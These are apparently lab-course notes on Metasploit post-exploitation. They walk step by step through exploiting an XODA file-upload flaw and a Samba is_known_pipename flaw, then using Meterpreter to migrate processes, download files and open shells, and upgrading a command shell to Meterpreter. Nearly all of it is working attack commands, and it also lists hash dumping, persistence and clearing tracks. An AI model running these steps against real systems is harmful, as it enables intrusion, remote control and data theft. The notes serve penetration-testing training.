# Meterpreter Fundamentals

## Post Exploitation

- **Post exploitation** refers to the actions performed on the target system **after initial access** has been obtained.
- The post exploitation phase of a penetration test includes various techniques such as:
  - **Local Enumeration**: Gathering information about the local system and environment.
  - **Privilege Escalation**: Gaining higher-level access on the target system.
  - **Dumping Hashes**: Extracting password hashes from the system.
  - **Establishing Persistence**: Ensuring continued access to the system.
  - **Clearing Tracks**: Removing evidence of compromise.
  - **Pivoting**: Using the compromised system as a pivot point to target other systems in the network.

## Meterpreter

- **Meterpreter (Meta-Interpreter)** is an advanced, multi-functional payload that operates via **DLL injection**, executed in memory, making it harder to detect.
- It communicates over a stager socket and provides an attacker with an **interactive command interpreter** to:
  - Execute system commands.
  - Navigate the file system.
  - Capture keylogs.
  - Load custom scripts and plugins dynamically.
- Metasploit offers various types of Meterpreter payloads depending on the **target environment** and **OS architecture**.

## Demo: Meterpreter Fundamentals

### Plan

We will first exploit a vulnerable web application, gain access to the system using Meterpreter, and perform basic post-exploitation tasks such as interacting with the session, navigating the file system, and using key Meterpreter commands.

### Step-by-Step Process

Check network interface configuration:

```bash
ifconfig
```

Start the PostgreSQL service and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the Meterpreter session:

```bash
workspace -a Meterpreter
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
setg rhost [targetIP]
```

Perform an Nmap scan to identify open ports and services:

```bash
db_nmap -sV [targetIP]
```

We find that there is a **web server** running on **port 80**, with no SSL certificate:

```bash
services
```

Download the homepage of the web server:

```bash
curl [targetIP]
```

Search for a known **XODA** exploit:

```bash
search xoda
```

Use the **XODA file upload exploit**:

```bash
use exploit/unix/webapp/xoda_file_upload
```

Show the available options:

```bash
show options
```

Set the **TARGETURI** to `/` because XODA is running on the root of the web server:

```bash
set TARGETURI /
```

Run the exploit to gain access:

```bash
run
```

### Interacting with Meterpreter Session

Once we have access, we can gather system information:

```bash
sysinfo
```

Check the current user ID:

```bash
getuid
```

Display the Meterpreter help menu:

```bash
help
```

### Managing Sessions

Background the current session:

```bash
background
```

List all active sessions:

```bash
sessions
```

Show help for the sessions command:

```bash
sessions -h
```

Run a command on the target without interacting with the session:

```bash
sessions -C sysinfo -i 1
```

Terminate a session:

```bash
sessions -k 1
```

List active sessions:

```bash
sessions -l
```

Name a session and interact with it:

```bash
sessions -n [name] -i 1
```

### File System Navigation Commands

- List files in the current directory:

    ```bash
    ls
    ```

- Check the current directory:

    ```bash
    pwd
    ```

- Move up one directory level:

    ```bash
    cd ..
    ```

- Read a file:

    ```bash
    cat flag.txt
    ```

- Edit a file:

    ```bash
    edit flag.txt
    ```

- Navigate to a file or directory with spaces in the name:

    ```bash
    cd "Secret Flag.txt"
    ```

- Download a file:

    ```bash
    download flag5.zip
    ```

### Working with Files

- Unzip a downloaded file:

    ```bash
    unzip flag5.zip
    ```

- Get the MD5 checksum of a binary:

    ```bash
    checksum md5 /bin/bash
    ```

- Check environment variables:

    ```bash
    getenv PATH
    getenv TERM
    ```

### Searching for Files

- Search for a specific file by name in a directory:

    ```bash
    search -d /usr/bin -f *backdoor*
    ```

- Search for image files:

    ```bash
    search -f *.jpg
    ```

- Search for PHP files:

    ```bash
    search -f *.php
    ```

### Downloading Files

Download a file from the target system:

```bash
download flag1
```

### Opening a Shell on the Target System

Open a shell on the target system:

```bash
shell
```

- List files in the shell:

    ```bash
    ls
    ```

- Open an interactive bash shell:

    ```bash
    /bin/bash -i
    ```

Exit the shell using **CTRL + C**.

### Managing Processes

List the running processes on the target system:

```bash
ps
```

Migrate to a specific process by its process ID:

```bash
migrate 500
```

Migrate to a process by name (e.g., apache2):

```bash
migrate -N apache2
```

Execute a command:

```bash
execute -f ifconfig
```

Create and remove directories:

- Create a directory:

    ```bash
    mkdir test
    ```

- Remove a directory:

    ```bash
    rmdir test
    ```

### Conclusion

What we accomplished:
- Used Meterpreter to interact with the compromised system.
- Navigated the file system and executed key commands.
- Managed sessions and interacted with the target system using both Meterpreter and shell commands.
- Demonstrated how to search, download, and manipulate files on the target system.

# Upgrading Command Shells to Meterpreter Shells

## Overview

In situations where we gain an initial **command shell** on a target system, it is often advantageous to upgrade this shell to a **Meterpreter session**. Meterpreter offers more advanced functionality such as file system navigation, process management, and post-exploitation capabilities. In this demo, we will use Metasploit to upgrade a simple command shell to a Meterpreter session.

## Demo: Upgrading Command Shells to Meterpreter Shells

### Step-by-Step Process

Start by checking the network interface configuration:

```bash
ifconfig
```

Start the PostgreSQL service and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the shell upgrade task:

```bash
workspace -a upgrading_shells
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

### Scanning and Exploiting

Perform an Nmap scan to identify open ports and services on the target system:

```bash
db_nmap -sV [targetIP]
```

Search for an available Samba exploit module:

```bash
search type:exploit name:samba
```

Use the **Samba is_known_pipename** exploit module:

```bash
use exploit/linux/samba/is_known_pipename
```

Show the available options for the exploit:

```bash
show options
```

Run the exploit to gain a **command shell**:

```bash
run
```

### Command Shell Interaction

Once we have a command shell, we can run basic commands:

- List files in the directory:

    ```bash
    ls
    ```

- Check the current working directory:

    ```bash
    pwd
    ```

- Navigate to the `/tmp` directory:

    ```bash
    cd /tmp
    ```

- Open an interactive Bash shell:

    ```bash
    /bin/bash -i
    ```

Background the shell session by pressing **CTRL + Z**.

### Managing Sessions

List all active sessions:

```bash
sessions
```

At this point, we have the command shell session running in the background.

### Upgrading the Shell to Meterpreter

Search for the **shell_to_meterpreter** post-exploitation module:

```bash
search shell_to_meterpreter
```

Use the **shell_to_meterpreter** module to upgrade the shell:

```bash
use post/multi/manage/shell_to_meterpreter
```

Show the available options for the module:

```bash
show options
```

Set the session ID of the current shell (assumed to be `1`):

```bash
set SESSION 1
```

Set the local host interface (replace `eth1` with your correct interface):

```bash
set LHOST eth1
```

Run the module to upgrade the shell:

```bash
run
```

### Verifying the Meterpreter Session

List active sessions again:

```bash
sessions
```

We now have a **Meterpreter session**. However, if we want to upgrade the **actual command shell session** instead of creating a new session, we can use the **sessions -u** command.

### Upgrading the Shell Session

Show the help for the sessions command:

```bash
sessions -h
```

Upgrade the existing session (replace `1` with the actual session ID):

```bash
sessions -u 1
```

List all active sessions to confirm the upgrade:

```bash
sessions
```

At this point, the **command shell** session has been successfully upgraded to a **Meterpreter session**.

### Conclusion

What we accomplished:
- Gained an initial **command shell** on the target system via the **Samba exploit**.
- Upgraded the **command shell** to a **Meterpreter session** using the **shell_to_meterpreter** module.
- Verified the successful session upgrade and explored key session management commands.
